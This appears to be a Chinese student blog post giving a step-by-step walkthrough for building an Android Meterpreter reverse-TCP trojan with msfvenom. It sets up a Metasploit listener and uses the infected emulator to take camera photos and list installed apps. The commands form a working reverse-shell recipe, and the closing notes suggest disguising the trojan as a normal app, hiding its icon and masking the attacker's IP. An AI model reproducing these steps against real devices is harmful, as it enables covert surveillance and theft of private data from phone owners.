---
title: Kali渗透安卓测试
declare: true
tags: [渗透测试, 大创]
categories: 毕设
---

# Kali渗透测试   
<!-- more -->  

## 下载Kali Linux
使用虚拟机即可。  
后面所有用户名、密码均为`kali`。   

## 打开root命令窗
输入指令，生成木马
```shell
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.213.130 lport=8927 R> /home/kali/Desktop/test.apk 
```
其中，`lhost` 是当前Kali的主机IP，`lport` 是端口号,`/home/Kali/Desktop/test.apk` 是要生成的木马的位置，这里我生成在桌面。`test.apk` 是生成木马的名字，可以自行修改。  
完成会有一个木马出现在kali的桌面。  
<img src = "/assets/graduation/生成木马.png" alt = "生成木马">

## 打开kali的MSF

<img src = "/assets/graduation/msf.png" alt = "msf">  

<img src = "/assets/graduation/msf(1).png" alt = "msf(1)">  

在MSF中开启监听 

### 绑定当前端口IP 
1. 选择模块
    ```shell
    use exploit/multi/handler
    ```
2. 选择攻击模块
    ```shell
    set payload android/meterpreter/reverse_tcp
    ```
3. 这里填写主机的IP
    ```shell
    set Lhost 192.168.213.130
    ```
4. 这里填写刚刚的端口
    ```shell
    set lport 8927
    ```
5. 查看设置的参数
    ```shell
    show options
    ```
    <img src = "/assets/graduation/绑定IP.png" alt = "绑定IP">  
6. 开始监听
    ```shell
    run
    ```
    <img src = "/assets/graduation/监听开始.png" alt = "监听开始">  

## 手机虚拟机
我这里直接使用了Android Studio的手机虚拟机，Nexus 5X API 29 Android 10.0 x86。  
将刚刚生成在kali桌面的test.apk安装到手机虚拟机中。(直接拖进去)  
这里经常会出现我们的主机检测到病毒阻止的情况，信任即可。  
这个安装的过程在现实生活中可能会是广告等因素诱导安装，反正是恶意软件就是了~~  

只需要用户点击一下手机的软件，木马就开始监听。  
<img src = "/assets/graduation/启动启动.png" alt = "启动启动">  

出现`Sending stage (78189 bytes) to 192.168.213.1` 即监听成功。 

## 获取权限 
安装的木马可以帮助我们获取手机的各种权限，比如摄像头、通讯录，甚至root。  

### 后置摄像头
我们试试用后置摄像头拍个照吧~  
```shell
webcam_snap -i 1
```
<img src = "/assets/graduation/获取后置摄像头.png" alt = "获取后置摄像头">  

<img src = "/assets/graduation/后置摄像头拍摄.jpeg" alt = "后置摄像头拍摄">  

因为是虚拟机所以这个画面是虚构的，想获取前置摄像头只需将上述命令的1改成2。  

### 手机app信息
可以获取手机app的信息
```shell
app_list
```
<img src = "/assets/graduation/app信息.png" alt = "app信息">  

***

## 小结
到这里其实还有许多地方需要完善：
- 攻击者可以不使用自己的IP，这样很容易被反监听，可以去调用外网穿透的IP、外网穿透的端口。  
- 生成的木马可以伪装成正常app，比如常见的 :heart_eyes::heart_eyes: 软件~~ ，还可以被植入在某些app中，用于获取收集信息，还可以隐藏图标。以上都可以在msf实现。  